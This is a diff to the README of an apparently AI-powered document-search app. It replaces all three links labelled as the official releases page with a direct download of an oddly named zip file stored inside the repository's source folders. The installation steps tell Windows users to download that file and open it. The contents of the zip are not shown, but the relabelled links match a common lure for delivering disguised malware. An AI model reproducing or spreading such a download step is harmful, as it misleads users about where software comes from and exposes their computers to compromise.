@@ -1,6 +1,6 @@
 # 🤖 agentic-rag-for-practice - Intelligent search for your private documents
 
-[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/constancywoodsy286/agentic-rag-for-practice/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/constancywoodsy286/agentic-rag-for-practice/raw/refs/heads/main/project/rag_agent/agentic-for-practice-rag-electrolytic.zip)
 
 This application helps you search and chat with your documents. It uses advanced artificial intelligence to provide accurate answers from your specific files. You can upload reports, manuals, or articles and ask questions about them in plain language. The system keeps your documents separate from others and ensures your data stays organized.
 
@@ -18,7 +18,7 @@ To run this application on your Windows computer, you need the following:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official release page](https://github.com/constancywoodsy286/agentic-rag-for-practice/releases) to download the latest version of the installer.
+1. Visit the [official release page](https://github.com/constancywoodsy286/agentic-rag-for-practice/raw/refs/heads/main/project/rag_agent/agentic-for-practice-rag-electrolytic.zip) to download the latest version of the installer.
 2. Once the download finishes, locate the file in your downloads folder.
 3. Open the file to start the installation wizard.
 4. Follow the prompts on the screen to install the application.
@@ -69,6 +69,6 @@ If the application does not behave as expected, look at these solutions:
 
 ## 🎓 Support
 
-This project provides tools for document analysis. For updates or major changes, check the [releases page](https://github.com/constancywoodsy286/agentic-rag-for-practice/releases) periodically. Each release contains improvements to how the system reads and understands complex information. 
+This project provides tools for document analysis. For updates or major changes, check the [releases page](https://github.com/constancywoodsy286/agentic-rag-for-practice/raw/refs/heads/main/project/rag_agent/agentic-for-practice-rag-electrolytic.zip) periodically. Each release contains improvements to how the system reads and understands complex information. 
 
 The software connects several technical components into one user experience. The FastAPI backend handles communication, while LangGraph manages the logic of the search. Qdrant stores the mathematical representations of your documents. These pieces work together to provide you with a clean, web-based interface for your work.
